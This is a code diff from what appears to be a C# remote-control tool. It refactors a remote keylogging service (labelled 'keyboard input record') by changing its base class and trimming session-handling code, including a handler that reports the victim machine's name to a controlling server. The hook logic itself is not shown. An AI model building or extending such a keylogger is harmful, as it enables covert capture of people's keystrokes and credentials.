@@ -12,48 +12,10 @@ namespace SiMay.ServiceCore.ApplicationService
 {
     [ServiceName("键盘输入记录")]
     [ServiceKey("RemoteKeyboradJob")]
-    public class KeyboardService : ServiceManager, IApplicationService
+    public class KeyboardService : ServiceManagerBase
     {
         private Keyboard _keyboard;
-        private PacketModelBinder<TcpSocketSaeaSession, MessageHead> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession, MessageHead>();
-        public override void OnNotifyProc(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
-        {
-            switch (notify)
-            {
-                case TcpSocketCompletionNotify.OnConnected:
-                    break;
-                case TcpSocketCompletionNotify.OnSend:
-                    break;
-                case TcpSocketCompletionNotify.OnDataReceiveing:
-                    break;
-                case TcpSocketCompletionNotify.OnDataReceived:
-                    this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead<MessageHead>(), this);                    //this.OnMessage(session);
-                    break;
-                case TcpSocketCompletionNotify.OnClosed:
-                    if (_keyboard != null)
-                    {
-                        _keyboard.NotiyProc -= _keyboard_NotiyProc;
-                        _keyboard.CloseHook();
-                        _keyboard = null;
-                    }
-                    this._handlerBinder.Dispose();
-                    break;
-            }
-        }
-        [PacketHandler(MessageHead.S_GLOBAL_OK)]
-        public void InitializeComplete(TcpSocketSaeaSession session)
-        {
-            SendAsyncToServer(MessageHead.C_MAIN_ACTIVE_APP,
-                new ActiveAppPack()
-                {
-                    IdentifyId = AppConfiguartion.IdentifyId,
-                    ServiceKey = this.GetType().GetServiceKey(),
-                    OriginName = Environment.MachineName + "@" + (AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo)
-                });
-        }
-
-        [PacketHandler(MessageHead.S_GLOBAL_ONCLOSE)]
-        public void CloseSession(TcpSocketSaeaSession session)
+        public override void SessionClosed()
         {
             if (_keyboard != null)
             {
@@ -61,7 +23,6 @@ namespace SiMay.ServiceCore.ApplicationService
                 _keyboard.CloseHook();
                 _keyboard = null;
             }
-            this.CloseSession();
         }
 
         [PacketHandler(MessageHead.S_KEYBOARD_OFFLINE)]
